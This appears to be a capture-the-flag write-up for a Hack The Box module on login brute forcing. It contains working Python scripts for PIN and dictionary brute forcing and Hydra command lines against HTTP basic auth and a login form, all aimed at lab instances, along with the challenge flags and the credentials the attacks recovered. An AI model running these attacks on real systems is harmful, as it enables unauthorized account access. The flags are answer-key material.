# HTB-Login_Brute_Forcing

## Table of Contents
1. [Brute Force Attacks](#brute-force-attacks)
    1. [Brute Force Attacks](#brute-force-attacks-1)
    2. [Dictionary Attacks](#dictionary-attacks)
2. [Hydra](#hydra)
    1. [Basic HTTP Authentication](#basic-http-authentication)
    2. [Login Forms](#login-forms)

## Brute Force Attacks
### Brute Force Attacks
#### Challenges
1. After successfully brute-forcing the PIN, what is the full flag the script returns?

    To solve this, we can modify script in the module to use thread for faster result.

    ```python
    import requests
    from concurrent.futures import ThreadPoolExecutor
    import time

    ip = "94.237.51.160"
    port = 33535
    MAX_WORKERS = 50  # Number of simultaneous requests (adjust based on network/server)

    def check_pin(pin):
        """Function to perform a single request and check for the flag."""
        formatted_pin = f"{pin:04d}"
        
        # Use a try-except block to handle connection errors gracefully
        try:
            response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}", timeout=5) # Add a timeout
            
            # Check if the server responds with success and the flag is found
            if response.ok:
                try:
                    # Assuming the flag is in the JSON response
                    data = response.json()
                    if 'flag' in data:
                        return formatted_pin, data['flag']
                except requests.exceptions.JSONDecodeError:
                    # Handle cases where the response isn't JSON but is OK (e.g., a "wrong pin" message)
                    pass

        except requests.exceptions.RequestException as e:
            # print(f"Error checking PIN {formatted_pin}: {e}") # Uncomment for debugging
            pass # Ignore errors and continue to the next PIN

        return None

    start_time = time.time()
    found_flag = False

    # Use ThreadPoolExecutor to run checks concurrently
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        # Map the check_pin function across the range of 0 to 9999
        # The executor runs these checks concurrently
        results = executor.map(check_pin, range(10000))
        
        for result in results:
            if result is not None:
                # We found the flag!
                pin, flag = result
                print(f"\nCorrect PIN found: {pin}")
                print(f"Flag: {flag}")
                # Since map() waits for all futures, we can't easily cancel. 
                # We just print the result and let the loop finish, or raise an exception to stop.
                found_flag = True
                break # Print, but the concurrent execution will continue until all workers finish
                
    end_time = time.time()
    print(f"\nTotal time elapsed: {end_time - start_time:.2f} seconds")
    ```
    ![alt text](<Assets/Brute Force Attacks.png>)

    The answer is `HTB{Brut3_F0rc3_1s_P0w3rfu1}`.

### Dictionary Attacks
#### Challenges
1. After successfully brute-forcing the target using the script, what is the full flag the script returns?

    We can use this script to solve this challenge.

    ```python
    import requests

    ip = "94.237.61.202"  # Change this to your instance IP address
    port = 41529       # Change this to your instance port number

    # Download a list of common passwords from the web and split it into lines
    passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

    # Try each password from the list
    for password in passwords:
        print(f"Attempted password: {password}")

        # Send a POST request to the server with the password
        response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

        # Check if the server responds with success and contains the 'flag'
        if response.ok and 'flag' in response.json():
            print(f"Correct password found: {password}")
            print(f"Flag: {response.json()['flag']}")
            break
    ```
    ![alt text](<Assets/Dictionary Attacks - 1.png>)

    The answer is `HTB{Brut3_F0rc3_M4st3r}`.

## Hydra
### Basic HTTP Authentication
#### Challenges
1. After successfully brute-forcing, and then logging into the target, what is the full flag you find?

    We can use hydra to solve this.

    ```bash
    hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 94.237.63.174 http-get / -s 37753
    ```
    Then we will get this credential, `basic-auth-user:Password@123`. We can use that to login from firefox. The answer is `HTB{th1s_1s_4_f4k3_fl4g}`.

### Login Forms
#### Challenges
1. After successfully brute-forcing, and then logging into the target, what is the full flag you find?

    Firs, we need to make sure what is invalid login response. In this case, `Invalid credentials` is the response. So we can use hydra with that condition.

    ```bash
    hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 94.237.63.174 -s 40173 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
    ```
    We will found this credential, `admin:zxcvbnm`. The answer is `HTB{W3b_L0gin_Brut3F0rc3}`.
